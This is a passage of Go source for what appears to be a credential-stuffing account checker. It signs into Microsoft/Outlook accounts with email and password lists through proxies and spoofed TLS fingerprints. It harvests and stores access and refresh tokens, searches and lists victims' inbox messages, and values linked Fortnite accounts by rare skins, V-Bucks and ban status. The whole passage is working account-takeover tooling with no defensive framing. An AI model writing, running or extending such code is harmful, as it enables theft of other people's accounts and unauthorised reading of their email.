	be2, _ := io.ReadAll(respE2.Body)
	respE2.Body.Close()
	code22 := extractJSONString(string(be2), "code")
	if code22 == "" {
		return "Fortnite: Check failed"
	}

	fnForm := url.Values{}
	fnForm.Set("grant_type", "exchange_code")
	fnForm.Set("exchange_code", code22)
	reqFN, _ := http.NewRequest("POST", "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", strings.NewReader(fnForm.Encode()))
	reqFN.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	reqFN.Header.Set("Authorization", EpicFortniteAuth)
	respFN, err := doReq(client, reqFN)
	if err != nil {
		return "Fortnite: Check failed"
	}
	bfn, _ := io.ReadAll(respFN.Body)
	respFN.Body.Close()
	at := extractJSONString(string(bfn), "access_token")
	if accID == "" {
		accID = extractJSONString(string(bfn), "account_id")
	}
	if at == "" {
		at = at1
	}

	displayName := extractJSONString(string(bt), "displayName")
	if accID != "" {
		reqAcc, _ := http.NewRequest("GET", "https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/"+accID, nil)
		reqAcc.Header.Set("Authorization", "bearer "+at1)
		reqAcc.Header.Set("User-Agent", "UELauncher/11.0.2-14967703+++Portal+Release-Live Windows/10.0.19041.1.256.64bit")
		if respAcc, err := doReq(client, reqAcc); err == nil {
			ba, _ := io.ReadAll(respAcc.Body)
			respAcc.Body.Close()
			if displayName == "" {
				displayName = extractJSONString(string(ba), "displayName")
			}
		}
	}

	// 7) STW check
	hasSTW := "NO"
	if accID != "" {
		stwURL := "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + accID + "/public/QueryPublicProfile?profileId=campaign"
		reqSTW, _ := http.NewRequest("POST", stwURL, strings.NewReader("{}"))
		reqSTW.Header.Set("Content-Type", "application/json")
		reqSTW.Header.Set("Authorization", "Bearer "+at)
		if respSTW, err := doReq(client, reqSTW); err == nil {
			bstw, _ := io.ReadAll(respSTW.Body)
			respSTW.Body.Close()
			if strings.Contains(string(bstw), "tutorial") {
				hasSTW = "YES"
			}
		}
	}

	// 8) Athena locker
	skins, wins, level, banned := 0, 0, 0, false
	specials := ""
	if accID != "" {
		athURL := "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + accID + "/client/QueryProfile?profileId=athena&rvn=-1"
		reqAth, _ := http.NewRequest("POST", athURL, strings.NewReader("{}"))
		reqAth.Header.Set("Content-Type", "application/json")
		reqAth.Header.Set("Authorization", "bearer "+at)
		reqAth.Header.Set("User-Agent", "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit")
		if respAth, err := doReq(client, reqAth); err == nil {
			bath, _ := io.ReadAll(respAth.Body)
			respAth.Body.Close()
			src := string(bath)
			if strings.Contains(src, "PLAY") && (strings.Contains(src, "1023") || strings.Contains(src, "banned") || respAth.StatusCode == 403) {
				banned = true
			}
			skins = strings.Count(src, `AthenaCharacter:`)
			if n, ok := jsonIntFrom(src, "lifetime_wins"); ok {
				wins = n
			}
			if n, ok := jsonIntFrom(src, "accountLevel"); ok {
				level = n
			}
			specials = detectSpecials(src)
		}
	}

	// 9) common_core — V-Bucks (Shared + MtxPurchased + MtxPurchaseBonus)
	vbucks := 0
	if accID != "" {
		ccURL := "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + accID + "/client/QueryProfile?profileId=common_core&rvn=-1"
		reqCC, _ := http.NewRequest("POST", ccURL, strings.NewReader("{}"))
		reqCC.Header.Set("Content-Type", "application/json")
		reqCC.Header.Set("Authorization", "bearer "+at)
		reqCC.Header.Set("User-Agent", "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit")
		if respCC, err := doReq(client, reqCC); err == nil {
			bcc, _ := io.ReadAll(respCC.Body)
			respCC.Body.Close()
			vbucks = parseVbucks(string(bcc))
		}
	}

	if banned {
		return "Fortnite: Account Banned"
	}

	parts := []string{}
	if displayName != "" {
		parts = append(parts, "Display: "+displayName)
	}
	parts = append(parts, fmt.Sprintf("Skins: %d", skins))
	parts = append(parts, fmt.Sprintf("Wins: %d", wins))
	parts = append(parts, fmt.Sprintf("Account Level: %d", level))
	parts = append(parts, "STW: "+hasSTW)
	parts = append(parts, fmt.Sprintf("VBucks: %d", vbucks))
	if specials != "" {
		parts = append(parts, "Specials: "+specials)
	}
	return "Fortnite: [" + strings.Join(parts, " | ") + "]"
}

type specialVariant struct {
	Channel string
	Stage   string
}

type specialDef struct {
	Name     string
	ID       string
	Variants []specialVariant // empty = ID only
}

func fortniteSpecialCatalog() []specialDef {
	return []specialDef{
		// OG skins — require the listed variant stage
		{Name: "OG Renegade", ID: "AthenaCharacter:cid_028_athena_commando_f", Variants: []specialVariant{{"Material", "Mat3"}}},
		{Name: "OG Aerial", ID: "AthenaCharacter:cid_017_athena_commando_m", Variants: []specialVariant{{"Parts", "Stage2"}}},
		{Name: "OG Skull", ID: "AthenaCharacter:cid_030_athena_commando_m_halloween", Variants: []specialVariant{{"ClothingColor", "Mat3"}}},
		{Name: "OG Ghoul", ID: "AthenaCharacter:cid_029_athena_commando_f_halloween", Variants: []specialVariant{{"Material", "Mat3"}}},
		{Name: "Max Omega", ID: "AthenaCharacter:cid_116_athena_commando_m_carbideblack", Variants: []specialVariant{{"Progressive", "Stage5"}}},
		{Name: "OG Travis", ID: "AthenaCharacter:cid_703_athena_commando_m_cyclone", Variants: []specialVariant{{"Parts", "Stage2"}}},
		{Name: "OG Ghost Portal", ID: "AthenaBackpack:bid_104_halloweenm", Variants: []specialVariant{{"ClothingColor", "Stage3"}}},
		{Name: "Gold Peely Pack", ID: "AthenaBackpack:bid_463_bananaagent", Variants: []specialVariant{{"Progressive", "Stage4"}}},
		{Name: "OG Mini Marauder", ID: "AthenaBackpack:bid_154_gingerbreadmale", Variants: []specialVariant{{"Material", "Stage2"}}},
		{Name: "OG Giddy-Gun", ID: "AthenaBackpack:bid_155_gingerbreadfemale", Variants: []specialVariant{{"Material", "Stage2"}}},

		// Flat promotional skins
		{Name: "Black Knight", ID: "AthenaCharacter:cid_035_athena_commando_m_medieval"},
		{Name: "Galaxy", ID: "AthenaCharacter:cid_175_athena_commando_m_celestial"},
		{Name: "IKONIK", ID: "AthenaCharacter:cid_313_athena_commando_m_kpopfashion"},
		{Name: "Honor Guard", ID: "AthenaCharacter:cid_342_athena_commando_m_streetracermetallic"},
		{Name: "Wonder", ID: "AthenaCharacter:cid_434_athena_commando_f_stealthhonor"},
		{Name: "Double Helix", ID: "AthenaCharacter:cid_183_athena_commando_m_modernmilitaryred"},
		{Name: "Stealth Reflex", ID: "AthenaCharacter:cid_386_athena_commando_m_streetopsstealth"},
		{Name: "Eon", ID: "AthenaCharacter:cid_174_athena_commando_f_carbidewhite"},
		{Name: "Wildcat", ID: "AthenaCharacter:cid_757_athena_commando_f_wildcat"},
		{Name: "Marshmello", ID: "AthenaCharacter:cid_333_athena_commando_m_squishy"},
		{Name: "Major Lazer", ID: "AthenaCharacter:cid_474_athena_commando_m_lasagna"},
		{Name: "Psycho Bandit", ID: "AthenaCharacter:cid_515_athena_commando_m_barbequelarry"},
		{Name: "Demogorgon", ID: "AthenaCharacter:cid_466_athena_commando_m_weirdobjectscreature"},
		{Name: "Travis Scott", ID: "AthenaCharacter:cid_703_athena_commando_m_cyclone"},
		{Name: "Astro Jack", ID: "AthenaCharacter:cid_761_athena_commando_m_cyclonespace"},

		// Pickaxes
		{Name: "Raider's Revenge", ID: "AthenaPickaxe:pickaxe_lockjaw"},
		{Name: "Axe of Champions", ID: "AthenaPickaxe:pickaxe_id_376_fncs"},
		{Name: "Axe of Champions 2.0", ID: "AthenaPickaxe:pickaxe_id_804_fncss20male"},
		{Name: "Merry Mint Axe", ID: "AthenaPickaxe:pickaxe_id_294_candycane"},
		{Name: "Resonator", ID: "AthenaPickaxe:pickaxe_id_077_carbidewhite"},
		{Name: "Stellar Axe", ID: "AthenaPickaxe:pickaxe_id_116_celestial"},
		{Name: "Angler Pickaxe", ID: "AthenaPickaxe:pickaxe_id_156_streetracerblue"},
		{Name: "Rhizonyx", ID: "AthenaPickaxe:pickaxe_id_109_archetypered"},
		{Name: "Pivot Axe", ID: "AthenaPickaxe:pickaxe_id_147_reflexred"},
		{Name: "Diamond Jack", ID: "AthenaPickaxe:pickaxe_id_365_cyclone"},
		{Name: "Lazer Axe", ID: "AthenaPickaxe:pickaxe_id_258_musicgroup"},
		{Name: "Psycho Buzz Axes", ID: "AthenaPickaxe:pickaxe_id_250_borderlands"},

		// Gliders
		{Name: "Aerial Assault One", ID: "AthenaGlider:glider_id_001"},
		{Name: "Discovery", ID: "AthenaGlider:glider_id_090_galaxy"},
		{Name: "Aurora", ID: "AthenaGlider:glider_id_088_criterionred"},
		{Name: "Teleporter", ID: "AthenaGlider:glider_id_109_archetypered"},
		{Name: "Pivot Glider", ID: "AthenaGlider:glider_id_147_reflexred"},
		{Name: "Snowflake", ID: "AthenaGlider:umbrella_season2"},
		{Name: "Astroworld Cyclone", ID: "AthenaGlider:glider_id_203_cyclone"},

		// Emotes
		{Name: "Floss", ID: "AthenaDance:eid_floss"},
		{Name: "The Worm", ID: "AthenaDance:eid_worm"},
		{Name: "Pony Up", ID: "AthenaDance:eid_ridetheponytwo"},
		{Name: "Scenario", ID: "AthenaDance:eid_kpopdance03"},
		{Name: "Levitate", ID: "AthenaDance:eid_davinci"},
		{Name: "Bhangra Boogie", ID: "AthenaDance:eid_bollywood"},
		{Name: "Click!", ID: "AthenaDance:eid_heelclick"},
		{Name: "Headbanger", ID: "AthenaDance:eid_headbang"},

		// Back blings
		{Name: "Black Shield", ID: "AthenaBackpack:bid_004_blackknight"},
		{Name: "Royale Shield", ID: "AthenaBackpack:bid_002_royaleknight"},
		{Name: "Squire Shield", ID: "AthenaBackpack:bid_001_bluesquire"},
		{Name: "Red Shield", ID: "AthenaBackpack:bid_003_redknight"},
		{Name: "Rust Bucket", ID: "AthenaBackpack:bid_027_scavenger"},
		{Name: "Cactus Jack", ID: "AthenaBackpack:bid_468_cyclone"},
		{Name: "Penguin", ID: "AthenaBackpack:bid_071_tencentpenguin"},
		{Name: "Insignia", ID: "AthenaBackpack:bid_072_tencentshield"},
		{Name: "Galactic Disc", ID: "AthenaBackpack:bid_102_galaxy"},
		{Name: "Telemetry", ID: "AthenaBackpack:bid_124_archetypered"},
		{Name: "Destabilizer", ID: "AthenaBackpack:bid_099_criterionred"},
		{Name: "Response Unit", ID: "AthenaBackpack:bid_168_reflexred"},
		{Name: "Cactus Jack", ID: "AthenaBackpack:bid_497_cyclone"},
		{Name: "Astroworld", ID: "AthenaBackpack:bid_498_astroworld"},
		{Name: "Deflector", ID: "AthenaBackpack:bid_053_commando"},
		{Name: "Kyo", ID: "AthenaBackpack:bid_291_cyberpunkblue"},
		{Name: "Phrenzy", ID: "AthenaBackpack:bid_612_skaterparkour"},
		{Name: "Blue Shift", ID: "AthenaBackpack:bid_039_tacticalblue"},
		{Name: "Carbon Pack", ID: "AthenaBackpack:bid_219_streetops"},
		{Name: "Mello Pod", ID: "AthenaBackpack:bid_198_marshmello"},
		{Name: "Lazer Wings", ID: "AthenaBackpack:bid_328_musicgroup"},
		{Name: "Psycho Claptrap", ID: "AthenaBackpack:bid_312_borderlands"},
		{Name: "RLG FNCS 2021", ID: "AthenaBackpack:bid_700_fncs"},
		{Name: "Precision", ID: "AthenaBackpack:bid_016_military"},
		{Name: "Backup Plan", ID: "AthenaBackpack:bid_018_commando"},
	}
}

func itemHasVariant(attrs map[string]interface{}, channel, stage string) bool {
	if channel == "" || stage == "" {
		return true
	}
	raw, ok := attrs["variants"]
	if !ok {
		return false
	}
	list, ok := raw.([]interface{})
	if !ok {
		return false
	}
	wantCh := strings.ToLower(channel)
	wantSt := strings.ToLower(stage)
	altSt := wantSt
	if strings.HasPrefix(wantSt, "stage") {
		altSt = "mat" + strings.TrimPrefix(wantSt, "stage")
	} else if strings.HasPrefix(wantSt, "mat") {
		altSt = "stage" + strings.TrimPrefix(wantSt, "mat")
	}
	matchTag := func(tag string) bool {
		t := strings.ToLower(tag)
		return strings.Contains(t, wantSt) || strings.Contains(t, altSt)
	}
	for _, v := range list {
		obj, ok := v.(map[string]interface{})
		if !ok {
			continue
		}
		ch, _ := obj["channel"].(string)
		if strings.ToLower(ch) != wantCh {
			continue
		}
		active, _ := obj["active"].(string)
		if matchTag(active) {
			return true
		}
		if owned, ok := obj["owned"].([]interface{}); ok {
			for _, o := range owned {
				if s, ok := o.(string); ok && matchTag(s) {
					return true
				}
			}
		}
	}
	return false
}

func collectAthenaItems(src string) map[string]map[string]interface{} {
	out := map[string]map[string]interface{}{}
	var root interface{}
	if json.Unmarshal([]byte(src), &root) != nil {
		return out
	}
	var walk func(v interface{})
	walk = func(v interface{}) {
		switch t := v.(type) {
		case map[string]interface{}:
			if tid, ok := t["templateId"].(string); ok && tid != "" {
				attrs, _ := t["attributes"].(map[string]interface{})
				if attrs == nil {
					attrs = map[string]interface{}{}
				}
				out[strings.ToLower(tid)] = attrs
			}
			for _, child := range t {
				walk(child)
			}
		case []interface{}:
			for _, child := range t {
				walk(child)
			}
		}
	}
	walk(root)
	return out
}

func specialKind(id string) string {
	low := strings.ToLower(id)
	switch {
	case strings.HasPrefix(low, "athenacharacter:"):
		return "Skins"
	case strings.HasPrefix(low, "athenabackpack:"):
		return "Backblings"
	case strings.HasPrefix(low, "athenapickaxe:"):
		return "Pickaxes"
	case strings.HasPrefix(low, "athenaglider:"):
		return "Gliders"
	case strings.HasPrefix(low, "athenadance:"):
		return "Emotes"
	default:
		return "Other"
	}
}

func detectSpecials(athenaJSON string) string {
	items := collectAthenaItems(athenaJSON)
	grouped := map[string][]string{}
	seen := map[string]bool{}
	order := []string{"Skins", "Backblings", "Pickaxes", "Gliders", "Emotes", "Other"}
	for _, def := range fortniteSpecialCatalog() {
		attrs, ok := items[strings.ToLower(def.ID)]
		if !ok {
			continue
		}
		okVar := true
		for _, need := range def.Variants {
			if !itemHasVariant(attrs, need.Channel, need.Stage) {
				okVar = false
				break
			}
		}
		if !okVar {
			continue
		}
		key := def.Name
		if seen[key] {
			continue
		}
		seen[key] = true
		kind := specialKind(def.ID)
		grouped[kind] = append(grouped[kind], def.Name)
	}
	var parts []string
	for _, kind := range order {
		names := grouped[kind]
		if len(names) == 0 {
			continue
		}
		parts = append(parts, fmt.Sprintf("[%s: %s]", kind, strings.Join(names, ", ")))
	}
	return strings.Join(parts, " ")
}

func itemQuantity(obj map[string]interface{}) int {
	switch q := obj["quantity"].(type) {
	case float64:
		return int(q)
	case json.Number:
		n, _ := q.Int64()
		return int(n)
	}
	return 0
}

func parseVbucks(src string) int {
	// Ledger rows have no platform / platform "None" (every pack ever received).
	// Current balance is Currency:Mtx* with a real platform: Shared, Live, IOSAppStore, etc.
	total := 0
	var walk func(v interface{})
	walk = func(v interface{}) {
		switch t := v.(type) {
		case map[string]interface{}:
			tid, _ := t["templateId"].(string)
			if strings.HasPrefix(strings.ToLower(tid), "currency:mtx") {
				plat := ""
				if attrs, ok := t["attributes"].(map[string]interface{}); ok {
					plat, _ = attrs["platform"].(string)
				}
				if plat != "" && !strings.EqualFold(plat, "None") {
					total += itemQuantity(t)
				}
			}
			for _, child := range t {
				walk(child)
			}
		case []interface{}:
			for _, child := range t {
				walk(child)
			}
		}
	}
	var root interface{}
	if json.Unmarshal([]byte(src), &root) == nil {
		walk(root)
	}
	return total
}

func cookieValue(jar http.CookieJar, rawURL, name string) string {
	u, err := url.Parse(rawURL)
	if err != nil || jar == nil {
		return ""
	}
	for _, c := range jar.Cookies(u) {
		if c.Name == name {
			return c.Value
		}
	}
	return ""
}

func extractJSONString(src, key string) string {
	// Prefer real JSON
	var obj map[string]interface{}
	if json.Unmarshal([]byte(src), &obj) == nil {
		if v, ok := obj[key]; ok {
			if s, ok := v.(string); ok {
				return s
			}
		}
	}
	return extractParameter(src, `"`+key+`":"`)
}

func jsonIntFrom(src, key string) (int, bool) {
	re := regexp.MustCompile(`"` + regexp.QuoteMeta(key) + `"\s*:\s*(-?\d+)`)
	m := re.FindStringSubmatch(src)
	if len(m) < 2 {
		return 0, false
	}
	var n int
	if _, err := fmt.Sscanf(m[1], "%d", &n); err != nil {
		return 0, false
	}
	return n, true
}

// searchInboxForKeywords performs a dedicated Outlook-client login (required for
type mailTok struct {
	Email        string `json:"email"`
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	CID          string `json:"cid"`
	When         int64  `json:"when"`
}

func mailTokFile() string {
	dir := filepath.Join(sessionsDir, "mail")
	_ = os.MkdirAll(dir, 0755)
	return filepath.Join(dir, "tokens.json")
}

func loadMailTokMap() map[string]mailTok {
	out := map[string]mailTok{}
	b, err := os.ReadFile(mailTokFile())
	if err != nil {
		return out
	}
	_ = json.Unmarshal(b, &out)
	return out
}

func saveMailToken(email, atk, rtk, cid string) {
	email = strings.ToLower(strings.TrimSpace(email))
	if email == "" || atk == "" {
		return
	}
	m := loadMailTokMap()
	m[email] = mailTok{Email: email, AccessToken: atk, RefreshToken: rtk, CID: cid, When: time.Now().Unix()}
	b, err := json.Marshal(m)
	if err != nil {
		return
	}
	_ = os.WriteFile(mailTokFile(), b, 0644)
}

func loadMailToken(email string) (mailTok, bool) {
	t, ok := loadMailTokMap()[strings.ToLower(strings.TrimSpace(email))]
	return t, ok && t.AccessToken != ""
}

func captureOutlookSession(client, noRedir tls_client.HttpClient, ua, email string) {
	if client == nil {
		return
	}
	if noRedir == nil {
		noRedir = client
	}
	authURL := "https://login.live.com/oauth20_authorize.srf?" + url.Values{
		"client_id":     {OutlookClientID},
		"response_type": {"token"},
		"scope":         {"service::outlook.office.com::MBI_SSL"},
		"redirect_uri":  {OutlookRedirect},
		"display":       {"touch"},
	}.Encode()
	req, err := http.NewRequest("GET", authURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", ua)
	resp, err := doReq(noRedir, req)
	if err != nil {
		return
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	combined := resp.Header.Get("Location") + "\n" + string(body)
	atk := extractParameter(combined, "access_token=")
	rtk := extractParameter(combined, "refresh_token=")
	if d, err := url.QueryUnescape(atk); err == nil && d != "" {
		atk = d
	}
	if d, err := url.QueryUnescape(rtk); err == nil && d != "" {
		rtk = d
	}
	if rtk != "" {
		exForm := url.Values{}
		exForm.Set("grant_type", "refresh_token")
		exForm.Set("client_id", OutlookClientID)
		exForm.Set("scope", OutlookScope)
		exForm.Set("redirect_uri", OutlookRedirect)
		exForm.Set("refresh_token", rtk)
		req4, _ := http.NewRequest("POST", OutlookTokenURL, strings.NewReader(exForm.Encode()))
		req4.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req4.Header.Set("User-Agent", "Outlook-Android/2.0")
		if resp4, err := doReq(client, req4); err == nil {
			b4, _ := io.ReadAll(resp4.Body)
			resp4.Body.Close()
			var tj map[string]interface{}
			if json.Unmarshal(b4, &tj) == nil {
				if a, ok := tj["access_token"].(string); ok && a != "" {
					atk = a
				}
				if r, ok := tj["refresh_token"].(string); ok && r != "" {
					rtk = r
				}
			}
		}
	}
	cid := ""
	if jar := client.GetCookieJar(); jar != nil {
		for _, c := range jar.Cookies(mustParseURL("https://login.live.com")) {
			if c.Name == "MSPCID" {
				cid = strings.ToUpper(c.Value)
				break
			}
		}
	}
	if atk != "" {
		saveMailToken(email, atk, rtk, cid)
	}
}

// inbox search scopes) then searches for each keyword.
// Returns keyword -> match count (0 if search failed for that kw).
func searchInboxForKeywords(email, password, proxyStr string, keywords []string) map[string]int {
	results := make(map[string]int)
	for _, kw := range keywords {
		results[kw] = 0
	}
	if len(keywords) == 0 {
		return results
	}

	preset := nextTLSPreset()
	client, noRedir := newTLSClientPairProfile(proxyStr, 30*time.Second, 25*time.Second, preset.profile)
	if client == nil || noRedir == nil {
		return results
	}
	jar := client.GetCookieJar()

	ua := preset.ua

	// 1) GET login.live.com for PPFT
	req, err := http.NewRequest("GET", "https://login.live.com/", nil)
	if err != nil {
		return results
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	resp, err := doReq(client, req)
	if err != nil {
		return results
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	ppft := extractPPFT(string(body))
	if ppft == "" {
		return results
	}

	uaid := ""
	for _, c := range jar.Cookies(mustParseURL("https://login.live.com")) {
		if c.Name == "uaid" {
			uaid = c.Value
		}
	}

	// 2) POST login with Outlook desktop client_id (required for later token scopes)
	postURL := "https://login.live.com/ppsecure/post.srf?client_id=" + OutlookClientID +
		"&redirect_uri=" + url.QueryEscape(OutlookRedirect) +
		"&response_type=token&scope=" + url.QueryEscape("service::outlook.office.com::MBI_SSL") +
		"&display=touch"
	if uaid != "" {
		postURL += "&uaid=" + uaid
	}
	form := url.Values{}
	form.Set("ps", "2")
	form.Set("PPFT", ppft)
	form.Set("PPSX", "Pa")
	form.Set("NewUser", "1")
	form.Set("IsFidoSupported", "1")
	form.Set("i13", "1")
	form.Set("login", email)
	form.Set("loginfmt", email)
	form.Set("type", "11")
	form.Set("LoginOptions", "1")
	form.Set("passwd", password)

	req2, err := http.NewRequest("POST", postURL, strings.NewReader(form.Encode()))
	if err != nil {
		return results
	}
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req2.Header.Set("Origin", "https://login.live.com")
	req2.Header.Set("User-Agent", ua)
	req2.Header.Set("Referer", "https://login.live.com/")
	resp2, err := doReq(client, req2)
	if err != nil {
		return results
	}
	io.Copy(io.Discard, resp2.Body)
	resp2.Body.Close()

	// 3) Authorize to obtain access_token + refresh_token
	authURL := "https://login.live.com/oauth20_authorize.srf?" + url.Values{
		"client_id":     {OutlookClientID},
		"response_type": {"token"},
		"scope":         {"service::outlook.office.com::MBI_SSL"},
		"redirect_uri":  {OutlookRedirect},
		"display":       {"touch"},
	}.Encode()
	req3, err := http.NewRequest("GET", authURL, nil)
	if err != nil {
		return results
	}
	req3.Header.Set("User-Agent", ua)
	resp3, err := doReq(noRedir, req3)
	if err != nil {
		return results
	}
	body3, _ := io.ReadAll(resp3.Body)
	resp3.Body.Close()
	loc := resp3.Header.Get("Location")
	combined := loc + "\n" + string(body3)

	// Tokens live in the URL fragment (#access_token=...)
	atk := extractParameter(combined, "access_token=")
	rtk := extractParameter(combined, "refresh_token=")
	if decoded, err := url.QueryUnescape(atk); err == nil && decoded != "" {
		atk = decoded
	}
	if decoded, err := url.QueryUnescape(rtk); err == nil && decoded != "" {
		rtk = decoded
	}

	// 4) Exchange refresh_token for substrate-scoped token (what search API needs)
	token := atk
	if rtk != "" {
		exForm := url.Values{}
		exForm.Set("grant_type", "refresh_token")
		exForm.Set("client_id", OutlookClientID)
		exForm.Set("scope", OutlookScope)
		exForm.Set("redirect_uri", OutlookRedirect)
		exForm.Set("refresh_token", rtk)
		req4, err := http.NewRequest("POST", OutlookTokenURL, strings.NewReader(exForm.Encode()))
		if err == nil {
			req4.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req4.Header.Set("User-Agent", "Outlook-Android/2.0")
			req4.Header.Set("x-ms-sso-Ignore-SSO", "1")
			if resp4, err := doReq(client, req4); err == nil {
				b4, _ := io.ReadAll(resp4.Body)
				resp4.Body.Close()
				var tj map[string]interface{}
				if json.Unmarshal(b4, &tj) == nil {
					if a, ok := tj["access_token"].(string); ok && a != "" {
						token = a
					}
				}
			}
		}
	}
	if token == "" {
		return results
	}

	// MSPCID for X-AnchorMailbox header
	cid := ""
	for _, c := range jar.Cookies(mustParseURL("https://login.live.com")) {
		if c.Name == "MSPCID" {
			cid = strings.ToUpper(c.Value)
			break
		}
	}
	rememberMailSess(email, token, cid)
	// 5) Search each keyword
	for _, kw := range keywords {
		results[kw] = doOutlookSearch(client, token, cid, email, kw)
	}
	return results
}

func cookieVal(jar http.CookieJar, name string) string {
	if jar == nil {
		return ""
	}
	for _, c := range jar.Cookies(mustParseURL("https://login.live.com")) {
		if c.Name == name {
			return c.Value
		}
	}
	return ""
}

func mustParseURL(s string) *url.URL {
	u, _ := url.Parse(s)
	return u
}

// doOutlookSearch performs one inbox search and returns the result count.
func doOutlookSearch(client tls_client.HttpClient, accessToken, cid, email, keyword string) int {
	searchBody := fmt.Sprintf(
		`{"Cvid":"7ef2720e-6e59-ee2b-a217-3a4f427ab0f7","Scenario":{"Name":"owa.react"},"TimeZone":"UTC","TextDecorations":"Off","EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],"Filter":{"Or":[{"Term":{"DistinguishedFolderName":"msgfolderroot"}},{"Term":{"DistinguishedFolderName":"DeletedItems"}}]},"From":0,"Query":{"QueryString":%q},"Size":25,"Sort":[{"Field":"Time","SortDirection":"Desc"}],"EnableTopResults":true,"TopResultsCount":3}],"LogicalId":"446c567a-02d9-b739-b9ca-616e0d45905c"}`,
		keyword,
	)

	// Prefer substrate endpoint (matches working OpenBullet-style token scope)
	endpoints := []string{
		"https://substrate.office.com/search/api/v2/query",
		"https://outlook.live.com/search/api/v2/query",
	}

	for _, ep := range endpoints {
		req, err := http.NewRequest("POST", ep, strings.NewReader(searchBody))
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "Outlook-Android/2.0")
		req.Header.Set("Accept", "application/json")
		req.Header.Set("Authorization", "Bearer "+accessToken)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("ForceSync", "false")
		if email != "" {
			req.Header.Set("X-AnchorMailbox", "SMTP:"+email)
		} else if cid != "" {
			req.Header.Set("X-AnchorMailbox", "CID:"+cid)
		}

		resp, err := doReq(client, req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 200 {
			continue
		}

		var raw interface{}
		if err := json.Unmarshal(body, &raw); err != nil {
			continue
		}
		if n := countSearchResults(raw); n >= 0 {
			return n
		}
	}
	return 0
}

type mailMsg struct {
	ID        string   `json:"id,omitempty"`
	ChangeKey string   `json:"change_key,omitempty"`
	Subject   string   `json:"subject"`
	From      string   `json:"from"`
	Date      string   `json:"date"`
	Preview   string   `json:"preview"`
	HTML      string   `json:"html,omitempty"`
	Images    []string `json:"images,omitempty"`
}

type mailSess struct {
	Token string
	CID   string
	Exp   time.Time
}

var (
	mailSessMu    sync.Mutex
	mailSessMap   = map[string]mailSess{}
	mailLastTotal int
)

func mailTokenFile() string {
	dir := filepath.Join(sessionsDir, "mail")
	_ = os.MkdirAll(dir, 0755)
	return filepath.Join(dir, "tokens.json")
}

func loadMailSessFile() {
	b, err := os.ReadFile(mailTokenFile())
	if err != nil {
		return
	}
	var m map[string]mailSess
	if json.Unmarshal(b, &m) != nil {
		return
	}
	mailSessMu.Lock()
	if mailSessMap == nil {
		mailSessMap = map[string]mailSess{}
	}
	for k, v := range m {
		mailSessMap[strings.ToLower(k)] = v
	}
	mailSessMu.Unlock()
}

func saveMailSessFile() {
	mailSessMu.Lock()
	cp := make(map[string]mailSess, len(mailSessMap))
	for k, v := range mailSessMap {
		cp[k] = v
	}
	mailSessMu.Unlock()
	_ = os.MkdirAll(filepath.Join(sessionsDir, "mail"), 0o755)
	b, err := json.MarshalIndent(cp, "", "  ")
	if err != nil {
		return
	}
	_ = os.WriteFile(mailTokenFile(), b, 0o600)
}

var mailSessLoaded int32

func rememberMailSess(email, token, cid string) {
	email = strings.ToLower(strings.TrimSpace(email))
	if email == "" || token == "" {
		return
	}
	if atomic.LoadInt32(&mailSessLoaded) == 0 {
		loadMailSessFile()
		atomic.StoreInt32(&mailSessLoaded, 1)
	}
	mailSessMu.Lock()
	mailSessMap[email] = mailSess{Token: token, CID: cid, Exp: time.Now().Add(12 * time.Hour)}
	mailSessMu.Unlock()
	saveMailSessFile()
}

func cachedMailSess(email string) (mailSess, bool) {
	if atomic.LoadInt32(&mailSessLoaded) == 0 {
		loadMailSessFile()
		atomic.StoreInt32(&mailSessLoaded, 1)
	}
	email = strings.ToLower(strings.TrimSpace(email))
	mailSessMu.Lock()
	defer mailSessMu.Unlock()
	s, ok := mailSessMap[email]
	if !ok || s.Token == "" {
		return mailSess{}, false
	}
	return s, true
}

func dropMailSess(email string) {
	mailSessMu.Lock()
	delete(mailSessMap, strings.ToLower(strings.TrimSpace(email)))
	mailSessMu.Unlock()
	saveMailSessFile()
}

func handleMailProbe(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	var req struct {
		Email string `json:"email"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	w.Header().Set("Content-Type", "application/json")
	sess, ok := cachedMailSess(req.Email)
	if !ok {
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "need_login": true})
		return
	}
	msgs, alive, total := queryOutlookWithTokenOK(sess.Token, sess.CID, strings.TrimSpace(req.Email), 0, 100, "kind:email", "inbox")
	if !alive {
		dropMailSess(req.Email)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "need_login": true})
		return
	}
	more := len(msgs) >= 10
	if total > 0 {
		more = len(msgs) < total
	}
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "messages": msgs, "count": len(msgs), "total": total, "more": more, "reused": true})
}

func handleMailList(w stdhttp.ResponseWriter, r *stdhttp.Request) {
	if r.Method != stdhttp.MethodPost {
		stdhttp.Error(w, "POST only", 405)
		return
	}
	var req struct {
		Email     string   `json:"email"`
		Password  string   `json:"password"`
		Proxy     string   `json:"proxy"`
		ProxyMode string   `json:"proxy_mode"`
		ProxyURLs []string `json:"proxy_urls"`
		From      int      `json:"from"`
		Size      int      `json:"size"`
		Query     string   `json:"query"`
		Folder    string   `json:"folder"`
	}
